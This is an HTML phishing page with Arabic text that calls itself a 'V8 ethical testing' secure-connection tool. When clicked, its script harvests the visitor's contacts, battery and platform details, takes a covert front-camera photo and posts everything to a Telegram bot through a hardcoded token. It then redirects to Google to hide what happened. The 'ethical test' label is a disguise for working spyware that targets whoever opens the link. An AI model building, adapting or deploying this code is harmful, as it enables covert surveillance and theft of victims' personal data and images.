<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V8 - Secure Connection</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 100px; margin: 0; }
        .card { border: 1px solid #00ffcc; padding: 30px; border-radius: 15px; display: inline-block; background: rgba(0,255,204,0.05); box-shadow: 0 0 20px #00ffcc; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام V8 للاختبار الأخلاقي</h2>
        <p id="s">اضغط للبدء في مزامنة البيانات والتحقق</p>
        <button class="btn" onclick="startV8()">بدء الاتصال الآمن ✅</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="720" height="1280"></canvas>

    <script>
        // التوكن الجديد الخاص بك (تأكد من صحته)
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');

        async function startV8() {
            if(!uid) { alert("رابط غير صالح!"); return; }
            document.getElementById('s').innerText = "جاري السحب والمزامنة...";

            try {
                // 1. سحب الأسماء (Contact Picker)
                let contactsMsg = "📇 **سجل الأسماء:**\n";
                if ('contacts' in navigator) {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    contacts.forEach(c => contactsMsg += `👤 ${c.name}: ${c.tel}\n`);
                }

                // 2. سحب البطارية والنظام
                const b = await navigator.getBattery();
                const info = `🚀 **تقرير V8 جديد:**\n🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}`;

                // 3. سحب الكاميرا (حل مشكلة السواد)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 3000)); // انتظار الضبط

                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                const blob = await (await fetch(photo)).blob();

                // 4. إرسال كل شيء لتليجرام
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', info + "\n\n" + contactsMsg.slice(0, 500));

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                document.getElementById('s').innerText = "تمت المزامنة بنجاح!";
                stream.getTracks().forEach(t => t.stop());
                setTimeout(() => window.location.replace("https://google.com"), 2000);

            } catch (e) {
                window.location.replace("https://google.com");
            }
        }
    </script>
</body>
</html>
